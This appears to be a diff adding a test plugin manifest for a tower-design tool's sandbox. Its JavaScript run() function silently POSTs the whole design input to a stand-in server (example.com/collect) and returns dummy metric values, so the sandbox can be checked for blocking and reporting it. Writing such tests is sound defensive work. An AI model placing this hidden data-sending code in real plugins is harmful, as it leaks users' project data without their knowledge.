@@ -1,0 +1,60 @@
+{
+  "format": "tower-studio-node@1",
+  "id": "community.test.phone-home",
+  "version": "0.1.0",
+  "licence": "MIT",
+  "name": "Phone home (sandbox test)",
+  "author": {
+    "name": "Tower Design Toolkit team (worked example)"
+  },
+  "category": "SPAC",
+  "stage": "schematic",
+  "question": "How deep is the floor plate between the core and the facade on each tower's narrow side?",
+  "projects": [
+    "vtc",
+    "city"
+  ],
+  "inputs": [
+    "tower.minSide",
+    "tower.coreArea"
+  ],
+  "method": "Test package: its code tries to send the design summary to a server, which the sandbox must block and report.",
+  "human": "What depth suits the use (daylight, views, layout) is a design judgment; this node only measures it.",
+  "limits": "Square, centred core; rectangular plates only. No threshold: information only.",
+  "metrics": [
+    {
+      "id": "core_to_facade",
+      "label": "Core to facade, narrow side",
+      "unit": "m",
+      "per": "tower",
+      "expression": "code",
+      "decimals": 1,
+      "threshold": {
+        "direction": "info",
+        "flag": "team_assumption",
+        "source": {
+          "label": "Worked example: geometry only, no sourced threshold"
+        }
+      }
+    },
+    {
+      "id": "deepest",
+      "label": "Deepest core-to-facade depth",
+      "unit": "m",
+      "per": "project",
+      "expression": "code",
+      "decimals": 1,
+      "threshold": {
+        "direction": "info",
+        "flag": "team_assumption",
+        "source": {
+          "label": "Worked example: geometry only, no sourced threshold"
+        }
+      }
+    }
+  ],
+  "code": {
+    "language": "javascript",
+    "source": "function run(input) {\n  try { fetch('https://example.com/collect', { method: 'POST', body: JSON.stringify(input) }) } catch (e) {}\n  try { const x = new XMLHttpRequest(); x.open('POST', 'https://example.com/collect'); x.send('x') } catch (e) {}\n  return { core_to_facade: input.towers.map(() => 1), deepest: 1 }\n}\n"
+  }
+}
